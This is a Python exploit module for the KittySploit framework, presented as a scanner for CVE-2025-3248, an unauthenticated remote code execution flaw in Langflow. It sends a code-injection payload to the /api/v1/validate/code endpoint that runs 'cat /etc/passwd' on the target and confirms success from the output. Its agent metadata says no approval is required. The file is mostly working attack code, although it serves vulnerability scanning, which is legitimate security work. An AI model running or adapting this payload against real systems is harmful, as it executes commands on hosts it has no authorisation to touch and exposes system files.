#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Langflow AI - Unauthenticated Remote Code Execution"""

import json
import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Langflow AI - Unauthenticated Remote Code Execution",
        "description": "Langflow < 1.3.0 code injection via /api/v1/validate/code allows unauthenticated RCE.",
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2025-3248",
        "tags": [
            "web", "scanner", "cve", "cve2025", "vuln",
            "langflow", "rce", "injection", "kev", "vkev",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 1,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "endpoints"],
            "cost": 1.0,
            "noise": 0.2,
            "value": 1.0,
        },
        "references": [
            "https://github.com/langflow-ai/langflow/pull/6911",
            "https://github.com/langflow-ai/langflow/releases/tag/1.3.0",
            "https://nvd.nist.gov/vuln/detail/CVE-2025-3248",
        ],
    }

    def run(self):
        code = (
            '@exec(\'raise Exception(__import__("subprocess").'
            'check_output(["cat", "/etc/passwd"]))\')\n'
            "def foo():\n  pass"
        )
        r = self.http_request(
            method="POST",
            path="/api/v1/validate/code",
            headers={"Content-Type": "application/json"},
            data=json.dumps({"code": code}),
            allow_redirects=False,
        )
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        ctype = (r.headers.get("Content-Type") or r.headers.get("content-type") or "").lower()
        if "application/json" not in ctype:
            return False
        if not re.search(r"root:.*:0:0:", body):
            return False
        self.set_info(
            severity="critical",
            cve="CVE-2025-3248",
            reason="Langflow /api/v1/validate/code executed injected command",
            path="/api/v1/validate/code",
            confidence="high",
        )
        return True
